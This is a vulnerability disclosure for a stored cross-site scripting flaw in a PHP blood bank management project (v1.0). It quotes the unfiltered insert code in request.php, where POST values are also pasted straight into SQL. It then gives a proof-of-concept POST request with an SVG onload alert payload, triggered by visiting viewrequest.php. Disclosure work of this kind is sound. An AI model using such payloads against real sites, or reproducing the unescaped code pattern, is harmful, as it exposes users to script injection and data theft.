# blood-bank-system-in-php

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

request.php ， viewrequest.php ，requestblood tables 

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

This vulnerability is triggered by a remote attack

## Vulnerability Type

Basic Cross-Site-Scripting

## Root Cause

An attacker can insert XSS into the database request.php without filtering, and viewrequest.php can display XSS scripts from the database, resulting in a storage XSS vulnerability.

## Impact

## **Description of the vulnerability**

### qequest.php

See it，the $fullname paremeter is able to insert into requestblood table as $user parameter in not fillter.

![image-20241017101816838](https://github.com/user-attachments/assets/0e614a91-ed8d-4d30-a9b3-1a439d6ecbaa)

```
$fullname=$_POST['fullname'];

$query = "INSERT INTO `requestblood`(`id`, `user`, `Address`, `bloodgroup`, `phno`, `unit`, `time-for-flood`)
     VALUES ('','$fullname','$Address','$bloodgroup','$phno','$unit','$time')";
  $result = $con->query($query); 
  
  
  if($result === TRUE){
    echo 'Request has Successfully been Approved';
  ?>
    <meta content="4; blooddetails.php" http-equiv="refresh" />
  <?php
```

### viewrequest.php

In viewrequest.php，the code select * from requestblood，and echo $row['user'] in no filtter.This leads to a storage-based XSS vulnerability

### ![image-20241017102121797](https://github.com/user-attachments/assets/fbd5a72a-b4fd-4d94-aaac-3b3f4dddca55)                                                                                                                                                                                                                                                                                                                                                                                                      



## **Vulnerability recurrence**

### **POC1**	

Insert Cross-site-script into databases. 

```
POST /request.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/index.php
Cookie: PHPSESSID=g51sae8rs3qee728rpt92atbth
Upgrade-Insecure-Requests: 1
Priority: u=0, i

fullname=%3Csvg+onload%3Dalert%28%22xss%22%29%3B+%2F%3E&request=1
```

### Trigger the vulnerability

We just need to access the path

```
http://bloodbankmgmtsystem/viewrequest.php
```

![image-20241017103148277](https://github.com/user-attachments/assets/5d29cf4e-e7f9-4fb3-ad5b-f32960570c69)